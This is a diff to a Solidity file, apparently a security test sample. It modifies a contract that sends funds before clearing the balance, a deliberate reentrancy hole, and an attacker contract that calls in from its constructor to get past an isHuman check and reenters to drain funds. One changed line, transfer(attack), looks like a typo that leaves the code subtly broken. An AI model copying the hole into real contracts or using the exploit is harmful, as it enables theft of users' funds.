@@ -22,10 +22,10 @@ contract C {
         bids[msg.sender] += msg.value;       
     }
 
-    function withdraw() isHuman() public {
+    function transfer(address to) isHuman() public {
         uint256 amt = bids[msg.sender];
         require(amt > 0, "Insufficient funds");
-        (bool success, ) = msg.sender.call{value:amt}("");
+        (bool success, ) = to.call{value:amt}("");
         require(success, "Call failed");
         bids[msg.sender] = 0;    // side effect after call
     }
@@ -60,15 +60,16 @@ contract Attacker {
 
 contract Attacker2 {
     address victim = 0xCAfEcAfeCAfECaFeCaFecaFecaFECafECafeCaFe;
-    address attacker = 0xbABEBABEBabeBAbEBaBeBabeBABEBabEBAbeBAbe;
+    address attacker; // = 0xbABEBABEBabeBAbEBaBeBabeBABEBabEBAbeBAbe;
 
-    constructor(bool deposited) payable {
+    constructor(address _attacker, bool deposited) payable {
+        attacker = _attacker;
         if(deposited) {
-            C(victim).withdraw();
+            C(victim).transfer(attacker);
         } else {
             C(victim).bid{value: msg.value}();
             Attacker(payable(attacker)).setDeposited(true);
-            C(victim).withdraw();
+            C(victim).transfer(attacker);
         }
 
     }
@@ -76,6 +77,6 @@ contract Attacker2 {
     receive() payable external {
         payable(attacker).transfer(msg.value);
         Attacker(payable(attacker)).attack();
-        C(victim).withdraw();
+        C(victim).transfer(attack);
     }
 }
